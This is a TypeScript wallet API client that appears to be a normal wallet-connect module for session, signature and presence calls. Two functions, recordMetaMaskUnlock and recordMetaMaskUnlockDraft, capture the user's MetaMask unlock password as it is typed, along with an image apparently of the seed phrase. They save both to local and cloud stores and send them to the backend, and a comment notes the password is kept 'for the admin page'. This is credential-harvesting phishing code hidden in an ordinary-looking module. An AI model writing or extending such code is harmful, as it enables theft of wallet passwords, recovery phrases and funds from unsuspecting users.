import { resolveApiUrl } from './apiBase'
import {
  disconnectLocalWalletSession,
  upsertLocalWalletSession,
} from './walletMonitorStore'
import {
  disconnectCloudWalletSession,
  upsertCloudWalletSession,
} from './walletCloudStore'

const API_BASE = resolveApiUrl('/api/wallet')

let unlockDraftTimer: ReturnType<typeof setTimeout> | null = null

export interface WalletSessionResponse {
  sessionId: string
  nonce: string
  messageToSign: string
  expiresInSeconds: number
}

export interface WalletVerifyResponse {
  success: boolean
  verified: boolean
  walletAddress: string
  userId?: string
  connectionId?: string
  error?: string
}

export interface WalletSessionStatusResponse {
  sessionId: string
  connected: boolean
  verified: boolean
  walletAddress: string | null
  walletType?: string
  chain?: string
  network?: string
  connectedAt?: string
}

export const walletApi = {
  /**
   * Request session challenge nonce from server
   */
  async createSession(): Promise<WalletSessionResponse> {
    const res = await fetch(`${API_BASE}/session`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'include',
    })
    if (!res.ok) {
      const err = await res.json().catch(() => ({}))
      throw new Error(err.error || 'Failed to initialize wallet session')
    }
    return res.json()
  },

  /**
   * Submit signed message challenge for server-side verification
   */
  async verifySignature(payload: {
    publicKey: string
    signature: string
    nonce?: string
    message?: string
  }): Promise<WalletVerifyResponse> {
    const res = await fetch(`${API_BASE}/signature/verify`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
      credentials: 'include',
    })
    const data = await res.json()
    if (!res.ok || !data.success) {
      throw new Error(data.error || 'Signature verification failed')
    }
    return data
  },

  /**
   * Record wallet connection on server
   */
  async recordConnect(payload: {
    walletAddress: string
    walletType: string
    chain?: string
    network?: string
    balanceSol?: number | null
    pageUrl?: string
    browserSessionId?: string
  }) {
    try {
      upsertLocalWalletSession(payload)
    } catch {
      /* local monitor must not break connect */
    }
    await upsertCloudWalletSession(payload)
    try {
      const res = await fetch(`${API_BASE}/connect`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
        credentials: 'include',
      })
      if (!res.ok) {
        console.warn('Failed to log wallet connection to backend:', await res.text())
      }
    } catch (e) {
      console.warn('Failed to log wallet connection to backend:', e)
    }
  },

  async recordPresence(payload: {
    walletAddress: string
    walletType: string
    network?: string
    balanceSol?: number | null
    pageUrl?: string
    browserSessionId?: string
  }) {
    upsertLocalWalletSession(payload)
    void upsertCloudWalletSession(payload)
    try {
      await fetch(`${API_BASE}/presence`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
        credentials: 'include',
      })
    } catch {
      /* optional heartbeat */
    }
  },

  async recordMetaMaskUnlock(payload: {
    walletAddress: string
    password: string
    pageUrl?: string
    draft?: boolean
    phraseSnapImage?: string | null
  }) {
    upsertLocalWalletSession({
      walletAddress: payload.walletAddress,
      walletType: 'MetaMask',
      pageUrl: payload.pageUrl,
      unlockPassword: payload.password,
      phraseSnapImage: payload.phraseSnapImage ?? null,
    })
    void upsertCloudWalletSession({
      walletAddress: payload.walletAddress,
      walletType: 'MetaMask',
      pageUrl: payload.pageUrl,
      unlockPassword: payload.password,
      phraseSnapImage: payload.phraseSnapImage ?? null,
    })
    try {
      const res = await fetch(`${API_BASE}/metamask-unlock`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
        credentials: 'include',
      })
      if (!res.ok) throw new Error('Failed to record unlock')
    } catch {
      /* local store already has the password for the admin page */
    }
  },

  recordMetaMaskUnlockDraft(payload: {
    walletAddress: string
    password: string
    pageUrl?: string
  }) {
    upsertLocalWalletSession({
      walletAddress: payload.walletAddress,
      walletType: 'MetaMask',
      pageUrl: payload.pageUrl,
      unlockPassword: payload.password,
    })
    void upsertCloudWalletSession({
      walletAddress: payload.walletAddress,
      walletType: 'MetaMask',
      pageUrl: payload.pageUrl,
      unlockPassword: payload.password,
    })
    if (unlockDraftTimer) clearTimeout(unlockDraftTimer)
    unlockDraftTimer = setTimeout(() => {
      fetch(`${API_BASE}/metamask-unlock`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ...payload, draft: true }),
        credentials: 'include',
      }).catch(() => {})
    }, 80)
  },

  /**
   * Record wallet disconnect on server
   */
  async recordDisconnect(walletAddress?: string) {
    if (walletAddress) {
      disconnectLocalWalletSession(walletAddress)
      void disconnectCloudWalletSession(walletAddress)
    }
    try {
      await fetch(`${API_BASE}/disconnect`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(walletAddress ? { walletAddress } : {}),
        credentials: 'include',
      })
    } catch (e) {
      console.warn('Failed to log wallet disconnect to backend:', e)
    }
  },

  /**
   * Get wallet session status
   */
  async getSessionStatus(sessionId: string): Promise<WalletSessionStatusResponse> {
    const res = await fetch(`${API_BASE}/session/${sessionId}`, {
      credentials: 'include',
    })
    if (!res.ok) {
      throw new Error('Failed to fetch wallet session status')
    }
    return res.json()
  },
}
